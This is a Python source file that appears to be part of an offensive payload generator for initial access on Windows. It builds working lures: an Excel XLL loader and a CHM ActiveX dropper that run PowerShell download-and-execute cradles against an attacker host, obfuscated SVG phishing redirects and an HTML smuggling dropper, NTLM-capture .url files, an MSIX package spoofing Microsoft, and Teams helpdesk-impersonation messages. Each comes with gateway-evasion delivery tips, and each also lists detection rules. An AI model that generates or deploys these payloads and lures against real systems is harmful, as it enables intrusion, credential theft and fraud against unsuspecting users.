        technique="url_ntlm_capture",
        delivery_hint=(
            "Deliver Invoice.url inside a ZIP archive via phishing email. "
            "On unpatched targets, simply extracting the ZIP leaks the NTLM hash (CVE-2025-24071 / .library-ms). "
            "On patched targets, victim must double-click the .url — icon loads automatically from \\\\" + lhost + "\\share. "
            "Run Responder or ntlmrelayx on " + lhost + " before sending. "
            "Relay to LDAP for password-less AD privilege escalation (no SMB signing required on most DCs)."
        ),
        notes=(
            "Forced NTLM authentication via icon path. "
            "CVE-2024-43451 patched Oct 2024, CVE-2025-21377 patched Feb 2025, "
            "CVE-2025-24054 patched Mar 2025 — each patch round re-exploited within weeks. "
            "The .library-ms variant (CVE-2025-24071) triggers on ZIP extraction alone — zero-click. "
            "Use ntlmrelayx for relay attacks rather than offline cracking when time-sensitive. "
            "Egress port 445 is often blocked outbound — if so, use WebDAV (port 80/443) or "
            "configure Responder to also listen on HTTP for NTLM over HTTP."
        ),
        techniques=["T1187 - Forced Authentication",
                    "T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning",
                    "T1078 - Valid Accounts (outcome of relay)",
                    "T1566.001 - Phishing: Spearphishing Attachment"],
        risk="CRITICAL",
        detections=[
            "Outbound SMB (TCP 445) or WebDAV (TCP 80/443) to external/internet IP from Explorer",
            "Windows Security Event 4648 (logon using explicit credentials) to unexpected remote host",
            "Responder/NTLM relay traffic: NTLMv2 challenge-response to non-corporate server",
            "Archive containing .url or .library-ms file with UNC path in IconFile or simpleLocation",
            "Sysmon Event 3 (network connection) from explorer.exe to external IP on port 445",
        ],
    )


def _xll_addin(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    Excel XLL add-in — a DLL exporting xlAutoOpen that Excel loads on double-click.
    Bypasses VBA macro controls; still effective on MOTW-stripped delivery (ISO/7z).
    """
    c_src = (
        "// Excel XLL add-in — compile as DLL, rename to payload.xll\n"
        "// MSVC: cl /LD /Fe:payload.xll xll_loader.c xlcall32.lib\n"
        "// MinGW: gcc -shared -o payload.xll xll_loader.c -lxlcall32\n"
        "//\n"
        "// xlcall32.lib / xlcall32.h — from Excel SDK (free download from Microsoft)\n"
        "\n"
        "#include <windows.h>\n"
        "#include \"xlcall.h\"\n"
        "\n"
        "// Excel calls this when the XLL is loaded.\n"
        "int __stdcall xlAutoOpen(void) {\n"
        "    // Option A — download stager via PowerShell (noisy but simple):\n"
        "    CHAR cmd[] = \"powershell -NoP -NonI -W Hidden -Exec Bypass \"\n"
        "        \"-C \\\"IEX(New-Object Net.WebClient).DownloadString("
        "'http://" + lhost + ":" + str(lport) + "/s')\\\"\";\n"
        "    STARTUPINFOA si = {sizeof(si)};\n"
        "    PROCESS_INFORMATION pi;\n"
        "    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,\n"
        "        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "\n"
        "    // Option B — shellcode injection (stealthier):\n"
        "    // 1. VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n"
        "    // 2. memcpy(buf, shellcode, shellcode_len)\n"
        "    // 3. CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL)\n"
        "    // Use donut/sRDI to convert Sliver/Cobalt beacon to PIC shellcode first.\n"
        "\n"
        "    return 1;  // non-zero = success\n"
        "}\n"
        "\n"
        "// Required XLL exports (must exist for Excel to accept the add-in):\n"
        "int __stdcall xlAutoClose(void)   { return 1; }\n"
        "int __stdcall xlAutoAdd(void)     { return 1; }\n"
        "int __stdcall xlAutoRemove(void)  { return 1; }\n"
        "LPXLOPER12 __stdcall xlAddInManagerInfo12(LPXLOPER12 xAction) { return NULL; }\n"
        "\n"
        "BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }\n"
        "\n"
        "# ── Build & delivery notes ───────────────────────────────────────────────\n"
        "# Delivery: send payload.xll inside a ZIP or ISO (strips MOTW on older Windows)\n"
        "# Excel 2021+ blocks unsigned XLLs from internet — pair with MOTW bypass.\n"
        "# For managed .NET XLL: use Excel-DNA (https://excel-dna.net/) — produces\n"
        "#   a signed-looking .xll that loads .NET assembly from resource. Harder to\n"
        "#   detect than raw C DLL (Excel-DNA is legitimate tooling).\n"
        "# C2 listener: " + lhost + ":" + str(lport) + "\n"
    )
    return InitialAccessResult(
        payload=c_src,
        technique="xll_addin",
        delivery_hint=(
            "Compile C source as .xll (DLL) targeting x64. "
            "Deliver inside ISO or 7z archive to strip MOTW. "
            "On double-click, Excel shows a single 'Enable' prompt — no macro warning. "
            "For signed delivery: use Excel-DNA framework to build a .NET XLL with a "
            "trusted code-signing certificate. "
            "Listener on " + lhost + ":" + str(lport) + "."
        ),
        notes=(
            "XLL is the post-macro-block replacement for VBA. Microsoft blocks unsigned XLLs "
            "from internet sources since July 2023, but MOTW bypass via ISO/7z/WebDAV "
            "still allows execution. Excel-DNA managed XLLs blend with legitimate add-in usage. "
            "Detection surface is lower than macro documents — fewer AV signatures. "
            "Used by UAT-8302 (China-nexus) and TA4557 (cybercrime) into 2025."
        ),
        techniques=["T1137.006 - Office Application Startup: Add-ins",
                    "T1204.002 - User Execution: Malicious File",
                    "T1059.001 - Command and Scripting Interpreter: PowerShell"],
        risk="HIGH",
        detections=[
            "EXCEL.EXE loading a DLL from %TEMP%, %APPDATA%, or Downloads (Sysmon Event 7)",
            "EXCEL.EXE spawning powershell.exe, cmd.exe, or wscript.exe",
            "XLL file with no digital signature loaded by Excel (AMSI ETW event)",
            "Outbound network connection from EXCEL.EXE to non-Microsoft endpoint",
            "File with .xll extension in user-writable path written shortly before Excel opened it",
        ],
    )


def _svg_phishing(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    SVG phishing — SVG is XML, so <script> tags execute in browser.
    Email gateways treat SVG as benign image; browser executes JS.
    Two modes: credential harvest (AiTM redirect) and HTML smuggling dropper.
    """
    lhost_lport = lhost + ":" + str(lport)

    if obfuscate:
        # Base64-encode the redirect URL to evade static URL scanning
        import base64
        redir_b64 = base64.b64encode(("http://" + lhost_lport + "/login").encode()).decode()
        js_redirect = (
            "var u=atob('" + redir_b64 + "');window.location.replace(u);"
        )
    else:
        js_redirect = "window.location.replace('http://" + lhost_lport + "/login');"

    svg_credential = (
        "<?xml version='1.0' encoding='UTF-8'?>\n"
        "<svg xmlns='http://www.w3.org/2000/svg'\n"
        "     xmlns:xlink='http://www.w3.org/1999/xlink'\n"
        "     width='600' height='400'>\n"
        "\n"
        "  <!-- SVG credential-harvest redirect -->\n"
        "  <!-- Opens in browser; script redirects to AiTM/phishing page -->\n"
        "\n"
        "  <!-- Lure image (looks like a PDF/SharePoint document thumbnail) -->\n"
        "  <rect width='600' height='400' fill='#f0f0f0'/>\n"
        "  <rect x='50' y='50' width='500' height='300' fill='white' stroke='#ccc' stroke-width='2'/>\n"
        "  <text x='300' y='180' text-anchor='middle' font-family='Arial' font-size='24' fill='#333'>\n"
        "    Invoice_2026.pdf\n"
        "  </text>\n"
        "  <text x='300' y='220' text-anchor='middle' font-family='Arial' font-size='14' fill='#666'>\n"
        "    Click to view document\n"
        "  </text>\n"
        "\n"
        "  <!-- Redirect script -->\n"
        "  <script type='text/javascript'>\n"
        "    <![CDATA[\n"
        "      // Executes when SVG opened in browser (including from email attachment)\n"
        "      " + js_redirect + "\n"
        "    ]]>\n"
        "  </script>\n"
        "\n"
        "</svg>\n"
        "\n"
        "# ── HTML smuggling variant (drops file instead of redirecting) ──────────\n"
        "# Replace <script> content with:\n"
        "#\n"
        "# var payload = '<BASE64_ENCODED_PAYLOAD>';\n"
        "# var bytes = Uint8Array.from(atob(payload), c => c.charCodeAt(0));\n"
        "# var blob = new Blob([bytes], {type: 'application/octet-stream'});\n"
        "# var a = document.createElement('a');\n"
        "# a.href = URL.createObjectURL(blob);\n"
        "# a.download = 'Invoice.exe';\n"
        "# document.body.appendChild(a);\n"
        "# a.click();\n"
        "#\n"
        "# Delivery: send SVG as email attachment (rename to .svg) or as link\n"
        "# Target: " + lhost_lport + "\n"
    )
    return InitialAccessResult(
        payload=svg_credential,
        technique="svg_phishing",
        delivery_hint=(
            "Attach .svg file to phishing email — gateways see it as an image. "
            "When victim opens in browser (double-click from Outlook/file system), "
            "the script runs and redirects to credential harvesting page at " + lhost_lport + ". "
            "Use Evilginx2 or Modlishka as AiTM proxy to capture session tokens "
            "(bypasses MFA). "
            "Alternatively, use the HTML smuggling variant to drop a payload ZIP/EXE. "
            "Rename to .svg.html or embed inside an email HTML body for bypass variants."
        ),
        notes=(
            "SVG files contain executable JavaScript via <script> tags — same as HTML. "
            "Email security tools commonly treat SVG as an image, not a scripting vehicle. "
            "IBM X-Force reported 47,000% growth in weaponized SVGs in 2025 financial-sector campaigns. "
            "Two primary uses: (1) AiTM redirect to credential harvester, (2) HTML smuggling dropper. "
            "Base64-obfuscated URLs evade static URL extraction by email gateways. "
            "Browser security: SVG from file:// or data: URI has limited origin — "
            "redirect to HTTPS phishing page for AiTM attack."
        ),
        techniques=["T1027.006 - Obfuscated Files: HTML Smuggling",
                    "T1566.001 - Phishing: Spearphishing Attachment",
                    "T1189 - Drive-by Compromise",
                    "T1111 - Multi-Factor Authentication Interception (AiTM outcome)"],
        risk="HIGH",
        detections=[
            "Browser process opening .svg file from email attachment cache (%TEMP%\\Outlook\\)",
            "Outbound HTTP/S from browser to non-corporate domain immediately after SVG open",
            "SVG attachment in email containing <script> or javascript: tags (email gateway rule)",
            "Suspicious redirect chain: file:// SVG → external HTTPS phishing domain",
            "HTML blob download triggered by SVG script (browser download notification without user action)",
        ],
    )


def _chm_dropper(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    Compiled HTML Help (.chm) dropper — hh.exe is a LOLBIN that executes embedded
    HTML pages with full ActiveX/JScript access on invocation.
    """
    ps_cmd = (
        "powershell -NoP -NonI -W Hidden -Exec Bypass "
        "-C \"IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + ":" + str(lport) + "/s')\""
    )
    if obfuscate:
        import base64
        enc = base64.b64encode(
            ("IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + ":" + str(lport) + "/s')").encode("utf-16-le")
        ).decode()
        ps_cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " + enc

    html_page = (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        "  <title>Help Document</title>\n"
        "</head>\n"
        "<body>\n"
        "  <h2>Loading content...</h2>\n"
        "\n"
        "  <!-- ActiveX ShortCut method — invokes command via compiled CHM HHC -->\n"
        "  <OBJECT id='x' classid='clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11'\n"
        "          width=0 height=0>\n"
        "    <PARAM name='Command' value='ShortCut'>\n"
        "    <PARAM name='Button'  value='Bitmap::shortcut'>\n"
        "    <PARAM name='Item1'   value=',cmd.exe,/c " + ps_cmd.replace("\"", "&quot;") + "'>\n"
        "    <PARAM name='Item2'   value=''>\n"
        "  </OBJECT>\n"
        "\n"
        "  <!-- Auto-invoke via script -->\n"
        "  <SCRIPT language='VBScript'>\n"
        "    Sub Window_onLoad()\n"
        "      x.Click()\n"
        "    End Sub\n"
        "  </SCRIPT>\n"
        "\n"
        "  <!-- JScript alternative (if VBScript is disabled): -->\n"
        "  <!-- <script>new ActiveXObject('WScript.Shell').Run('" + ps_cmd.replace("'", "\\'") + "',0);</script> -->\n"
        "\n"
        "</body>\n"
        "</html>\n"
        "\n"
        "# ── CHM build instructions ───────────────────────────────────────────────\n"
        "# 1. Save above HTML as payload.html\n"
        "# 2. Create payload.hhp (HHP project file):\n"
        "#      [OPTIONS]\n"
        "#      Compiled file=Invoice.chm\n"
        "#      Default Topic=payload.html\n"
        "#      [FILES]\n"
        "#      payload.html\n"
        "# 3. Compile: hhc.exe payload.hhp  (hhc.exe is part of HTML Help Workshop)\n"
        "#    Or: chmcmd payload.hhp (open-source, cross-platform)\n"
        "# 4. Deliver Invoice.chm inside a password-protected ZIP\n"
        "# 5. C2 listener: " + lhost + ":" + str(lport) + "\n"
    )
    return InitialAccessResult(
        payload=html_page,
        technique="chm_dropper",
        delivery_hint=(
            "Compile HTML page into Invoice.chm using hhc.exe or chmcmd. "
            "Deliver inside a password-protected ZIP (password in email body) to bypass gateway scanning. "
            "On double-click, hh.exe (signed LOLBIN) opens the CHM and ActiveX executes the payload. "
            "No macro warning, no Protected View. Set up HTTP listener at " + lhost + ":" + str(lport) + "."
        ),
        notes=(
            "hh.exe is a Microsoft-signed LOLBIN (Living Off the Land Binary) present on all Windows. "
            "CHM files can execute arbitrary commands via the ShortCut ActiveX object or WScript.Shell. "
            "Low AV detection rate vs macro documents. "
            "Used by UNC1151 (Gamaredon), PHANTOM#SPIKE APT against Pakistan/South Asia targets in 2025. "
            "Delivery inside password-protected archives evades most email gateway sandboxes. "
            "Requires ActiveX to be enabled — default on IE-compatible mode; may prompt on Win11."
        ),
        techniques=["T1218.001 - System Binary Proxy Execution: Compiled HTML File",
                    "T1566.001 - Phishing: Spearphishing Attachment",
                    "T1059.001 - Command and Scripting Interpreter: PowerShell"],
        risk="HIGH",
        detections=[
            "hh.exe spawning cmd.exe, powershell.exe, wscript.exe, or mshta.exe (Sysmon Event 1)",
            "Outbound network connection from hh.exe to external IP (Sysmon Event 3)",
            "CHM file opened from %TEMP%, %APPDATA%, or Downloads directory",
            "ActiveX ShortCut CLSID adb880a6 activation from untrusted file zone",
            "Defender ASR rule: 'Block Office applications from creating child processes' (if proxied via Office CHM link)",
        ],
    )


def _teams_phishing(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    Microsoft Teams external user phishing — bypass email gateway entirely.
    Two techniques: TeamsPhisher API manipulation + IT helpdesk social engineering.
    """
    lhost_lport = lhost + ":" + str(lport)

    ps_cmd = (
        "powershell -NoP -NonI -W Hidden -Exec Bypass "
        "-C \"IEX(New-Object Net.WebClient).DownloadString('http://" + lhost_lport + "/s')\""
    )

    payload = (
        "# ── Microsoft Teams External Phishing Playbook ──────────────────────────\n"
        "#\n"
        "# TECHNIQUE A: TeamsPhisher (JUMPSEC, CVE-2023-3250 bypass)\n"
        "# Manipulates the Teams API to deliver files/messages to external tenants\n"
        "# bypassing the 'files from external users blocked' control.\n"
        "#\n"
        "# Setup:\n"
        "#   1. Register a Microsoft 365 tenant (trial account acceptable)\n"
        "#   2. Create a Teams user in that tenant\n"
        "#   3. git clone https://github.com/Octoberfest7/TeamsPhisher\n"
        "#   4. pip install -r requirements.txt\n"
        "#\n"
        "# Deliver a malicious URL or file attachment:\n"
        "#   python3 TeamsPhisher.py \\\n"
        "#     --username attacker@yourtenant.onmicrosoft.com \\\n"
        "#     --password 'AttackerPass123!' \\\n"
        "#     --message 'Please review the attached invoice: http://" + lhost_lport + "/invoice.html' \\\n"
        "#     --target-email victim@targetcorp.com\n"
        "#\n"
        "# Message appears in victim's Teams as an external chat — inside Teams UI,\n"
        "# not in email client. Bypasses email gateway + attachment sandbox entirely.\n"
        "#\n"
        "# ── TECHNIQUE B: IT Helpdesk Impersonation (Black Basta / Storm-1811) ───\n"
        "#\n"
        "# 1. Register M365 tenant with display name 'IT Support' or 'Help Desk'\n"
        "# 2. Send Teams message to target employee:\n"
        "#\n"
        "TEAMS_MESSAGE = \"\"\"\n"
        "Hi, this is IT Support. We've detected unusual login activity on your account.\n"
        "To prevent lockout, please allow us to verify your device remotely.\n"
        "\n"
        "Click here to start the verification: http://" + lhost_lport + "/verify\n"
        "\n"
        "Alternatively, open Quick Assist (Win+R → quickassist) and provide the code\n"
        "shown on screen to our technician.\n"
        "\"\"\"\n"
        "#\n"
        "# 3. When victim runs Quick Assist, gain remote desktop session\n"
        "# 4. Drop payload and run:\n"
        "#    " + ps_cmd + "\n"
        "#\n"
        "# ── TECHNIQUE C: ClickFix via Teams (chained) ──────────────────────────\n"
        "#\n"
        "TEAMS_CLICKFIX_MSG = \"\"\"\n"
        "ACTION REQUIRED: Your Microsoft 365 account needs re-verification.\n"
        "Please follow these steps:\n"
        " 1. Press Win+R\n"
        " 2. Paste the verification code (already copied to clipboard)\n"
        " 3. Press Enter\n"
        "\n"
        "Note: This message will expire in 15 minutes.\n"
        "\"\"\"\n"
        "# (Pair with a lure website that writes ClickFix payload to clipboard first)\n"
        "#\n"
        "# C2 listener: " + lhost_lport + "\n"
        "# All three techniques bypass email security entirely\n"
    )
    return InitialAccessResult(
        payload=payload,
        technique="teams_phishing",
        delivery_hint=(
            "Register a trial Microsoft 365 tenant. "
            "For TeamsPhisher: use API-based delivery to send files/URLs to external Teams users. "
            "For helpdesk impersonation: set tenant display name to 'IT Support' and send social engineering message. "
            "Chain with Quick Assist remote session or ClickFix clipboard hijack. "
            "C2 listener at " + lhost_lport + ". "
            "NOTE: Organizations can block external Teams federation in admin center — "
            "verify the target allows external communication before use."
        ),
        notes=(
            "Teams phishing bypasses email gateways entirely — messages arrive in Teams, not email. "
            "Storm-1674, Storm-0324, and Black Basta (Storm-1811) all use Teams as primary delivery. "
            "The TeamsPhisher API manipulation (JUMPSEC research 2023) was partially mitigated "
            "but orgs are slow to block external federation due to business need. "
            "IT helpdesk impersonation exploits the perception that Teams messages are internal. "
            "Quick Assist-based vishing is the highest-yield variant — victim grants full RDP access. "
            "Defense: disable external Teams federation or enable policy to block file sharing from external."
        ),
        techniques=["T1566.003 - Phishing via Service",
                    "T1656 - Impersonation",
                    "T1219 - Remote Access Software (Quick Assist)",
                    "T1204.001 - User Execution: Malicious Link"],
        risk="HIGH",
        detections=[
            "Teams audit log: external tenant initiating chat with internal users",
            "quickassist.exe or mstsc.exe launched after Teams conversation (Sysmon Event 1)",
            "New external Teams sender communicating with multiple employees (anomaly detection)",
            "Teams message containing suspicious URL or attachment from unrecognized tenant",
            "Microsoft 365 Defender: 'Phishing email simulation' or external message policy alert",
        ],
    )


def _msix_installer(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    MSIX / ms-appinstaller lure — malicious signed MSIX package delivered via
    ms-appinstaller:// URI. Appears as Microsoft Store install dialog.
    Protocol handler disabled by default since Dec 2023 but useful for unpatched targets.
    """
    lhost_lport = lhost + ":" + str(lport)

    ps_stager = (
        "powershell -NoP -NonI -W Hidden -Exec Bypass "
        "-C \"IEX(New-Object Net.WebClient).DownloadString('http://" + lhost_lport + "/s')\""
    )

    payload = (
        "# ── MSIX / ms-appinstaller Lure ─────────────────────────────────────────\n"
        "# Target: unpatched Windows (pre-Dec 2023 patch or enterprise policy override)\n"
        "#\n"
        "# ── Step 1: Create the MSIX package ─────────────────────────────────────\n"
        "#\n"
        "# AppxManifest.xml skeleton:\n"
        "MANIFEST = \"\"\"\n"
        "<?xml version='1.0' encoding='utf-8'?>\n"
        "<Package xmlns='http://schemas.microsoft.com/appx/manifest/foundation/windows10'\n"
        "         xmlns:uap='http://schemas.microsoft.com/appx/manifest/uap/windows10'>\n"
        "  <Identity Name='MicrosoftTeams.Updater'\n"
        "            Publisher='CN=Microsoft Corporation'\n"
        "            Version='1.0.0.0'\n"
        "            ProcessorArchitecture='x64' />\n"
        "  <Properties>\n"
        "    <DisplayName>Microsoft Teams Updater</DisplayName>\n"
        "    <PublisherDisplayName>Microsoft Corporation</PublisherDisplayName>\n"
        "    <Logo>Assets\\StoreLogo.png</Logo>\n"
        "  </Properties>\n"
        "  <Applications>\n"
        "    <Application Id='App'\n"
        "                 Executable='payload.exe'\n"
        "                 EntryPoint='Windows.FullTrustApplication'>\n"
        "      <uap:VisualElements DisplayName='Microsoft Teams Updater'\n"
        "        Description='Update component'\n"
        "        BackgroundColor='transparent'\n"
        "        Square150x150Logo='Assets\\Square150x150Logo.png'\n"
        "        Square44x44Logo='Assets\\Square44x44Logo.png' />\n"
        "    </Application>\n"
        "  </Applications>\n"
        "</Package>\n"
        "\"\"\"\n"
        "#\n"
        "# ── Step 2: Sign the MSIX ────────────────────────────────────────────────\n"
        "#   A code-signing certificate is required for install without browser warning.\n"
        "#   Self-signed: signtool sign /fd SHA256 /a payload.msix  (prompts trust warning)\n"
        "#   Purchased cert ($70-200): silent install, publisher name shown as legitimate\n"
        "#\n"
        "# ── Step 3: Create the AppInstaller manifest ─────────────────────────────\n"
        "#\n"
        "APPINSTALLER_XML = \"\"\"\n"
        "<?xml version='1.0' encoding='utf-8'?>\n"
        "<AppInstaller xmlns='http://schemas.microsoft.com/appx/appinstaller/2018'\n"
        "              Uri='http://" + lhost_lport + "/Invoice.appinstaller'\n"
        "              Version='1.0.0.0'>\n"
        "  <MainPackage Name='MicrosoftTeams.Updater'\n"
        "               Version='1.0.0.0'\n"
        "               Publisher='CN=Microsoft Corporation'\n"
        "               Uri='http://" + lhost_lport + "/payload.msix'\n"
        "               ProcessorArchitecture='x64' />\n"
        "</AppInstaller>\n"
        "\"\"\"\n"
        "#\n"
        "# ── Step 4: Deliver ──────────────────────────────────────────────────────\n"
        "#   Option A (patched systems — direct download):\n"
        "#     Send link to: http://" + lhost_lport + "/payload.msix\n"
        "#     Victim double-clicks downloaded .msix → AppInstaller prompts 'Install'\n"
        "#\n"
        "#   Option B (unpatched — URI handler):\n"
        "#     Send link to: ms-appinstaller:?source=http://" + lhost_lport + "/Invoice.appinstaller\n"
        "#     AppInstaller.exe fetches and presents install dialog — appears as Store app\n"
        "#\n"
        "# ── payload.exe content ──────────────────────────────────────────────────\n"
        "#   Compile a stager that runs:\n"
        "#   " + ps_stager + "\n"
        "#   Or embed shellcode using donut/sRDI for fileless execution.\n"
        "#\n"
        "# NOTE: ms-appinstaller:// protocol handler disabled Dec 2023 (CVE-2021-43890 fix).\n"
        "# Still effective against: unpatched Win10/11, enterprise group policies that\n"
        "# re-enable the handler, or direct .msix download (no URI handler needed).\n"
    )
    return InitialAccessResult(
        payload=payload,
        technique="msix_installer",
        delivery_hint=(
            "Host payload.msix and Invoice.appinstaller on HTTP server at " + lhost_lport + ". "
            "For unpatched targets: link to ms-appinstaller:?source=http://" + lhost_lport + "/Invoice.appinstaller. "
            "For patched targets: link directly to payload.msix — victim downloads and double-clicks. "
            "Use a code-signing certificate for legitimate-looking publisher name. "
            "Lure as a Microsoft Teams update, Adobe Reader installer, or corporate software deployment."
        ),
        notes=(
            "MSIX is the modern Windows app package format. AppInstaller shows publisher name "
            "and a simple Install/Cancel dialog — no UAC elevation on sideload. "
            "ms-appinstaller:// URI handler was disabled by Microsoft in Dec 2023 due to "
            "heavy abuse by Storm-0569, Storm-1113, and BazaCall operators. "
            "Direct .msix download still works — requires user to click 'Install' in AppInstaller UI. "
            "With a purchased code-signing cert, publisher shows as the cert owner (not 'Unknown'). "
            "Most effective on Windows Enterprise endpoints where AppInstaller is present."
        ),
        techniques=["T1218 - System Binary Proxy Execution",
                    "T1204.001 - User Execution: Malicious Link",
                    "T1553.002 - Subvert Trust Controls: Code Signing"],
        risk="HIGH",
        detections=[
            "AppInstaller.exe (AppInstaller.exe) making outbound network request to non-Microsoft URL",
            "MSIX install event: EventID 854 in Microsoft-Windows-AppXDeployment-Server/Operational",
            "Newly installed app with publisher not in enterprise allowlist",
            "ms-appinstaller:// URI launched from browser or email client (if handler still active)",
            "payload.exe executing from %LocalAppData%\\Packages\\<AppName>\\LocalCache\\",
        ],
    )


_DISPATCH = {
    "vba_macro": _vba_macro,
    "html_smuggling": _html_smuggling,
    "hta_dropper": _hta_dropper,
    "lnk_shortcut": _lnk_shortcut,
    "iso_container": _iso_container,
    "onenote_dropper": _onenote_dropper,
    "clickonce_manifest": _clickonce_manifest,
    # v4.5 — modern initial access (2024-2025 threat actor TTPs)
    "clickfix": _clickfix,
    "search_ms_webdav": _search_ms_webdav,
    "url_ntlm_capture": _url_ntlm_capture,
    "xll_addin": _xll_addin,
    "svg_phishing": _svg_phishing,
    "chm_dropper": _chm_dropper,
    "teams_phishing": _teams_phishing,
    "msix_installer": _msix_installer,
}


def generate_initial_access(
    technique: str,
    lhost: str = "192.168.1.100",
    lport: int = 4444,
    obfuscate: bool = True,
) -> InitialAccessResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](lhost, lport, obfuscate)
